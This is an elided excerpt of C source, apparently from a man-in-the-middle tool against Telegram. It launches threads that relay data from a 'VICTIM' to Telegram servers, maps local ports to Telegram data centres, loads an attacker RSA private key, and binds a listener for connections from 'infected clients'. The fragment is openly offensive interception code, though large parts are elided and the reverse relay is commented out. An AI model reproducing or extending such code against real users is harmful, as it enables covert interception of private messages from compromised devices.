...
pthread_t thread_victim2tg;
pthread_t thread_tg2victim;
...
/* static double _mitm_get_utime (int clock_id) { */
/*   struct timespec T; */
...
int mitm_launch_threads();
int mitm_launch_threads() {

  pthread_attr_t attr;

  /* All the threads will be joinable */
  ...
  if(pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE)) {
    fprintf(stderr, "Error: unable to set thread as JOINABLE\n");
    pthread_attr_destroy(&attr);   
    return 1;
  }

  /* Launch a thread for receiving data from VICTIM and forward 
     it to TELEGRAM */
  if(pthread_create(&thread_victim2tg, &attr, mitm_victim2tg, DC_working)) {
    fprintf(stderr, "Error creating thread\n");
    return 1;
  }

  /* /\* Launch a thread for receiving data from TELEGRAM and forward */
  /*    it to VICTIM *\/ */
  /* if(pthread_create(&thread_tg2victim, &attr, mitm_tg2victim, DC_working)) { */
  /*   fprintf(stderr, "Error creating thread\n"); */
  /*   return 1; */
  /* } */
...
void empty_auth_file (void) {
  ...
  switch(port) {
  case 65521:
    alloc_dc (1, tstrdup(TG_SERVER1), 443);
    break;
  case 65522:
    alloc_dc (1, tstrdup(TG_SERVER2), 443);
    break;
  case 65523:
    alloc_dc (1, tstrdup(TG_SERVER3), 443);
    break;
  case 65524:
    alloc_dc (1, tstrdup(TG_SERVER4), 443);
    break;
  case 65525:
    alloc_dc (1, tstrdup(TG_SERVER5), 443);
    break;
  case 65526:
    alloc_dc (1, tstrdup(TG_SERVER6), 443);
    break;
  }
  dc_working_num = 1;
  auth_state = 0;
...
int loop (void) {
  ...
  /* Open listening sockets for incomming connections 
     from infected clients */
  if(mitm_rsa_load_private_key ("mitm-tg.prv") == -1) {
    fprintf(stderr, "[MITM] Failed to load private key\n");
  }
  if(mitm_bind(port) == -1) {
    fprintf(stderr, "[MITM] Failed to bind MITM\n");
  }
...
//  if (auth_state == 0) {
  ...
  pthread_join(thread_victim2tg, NULL);
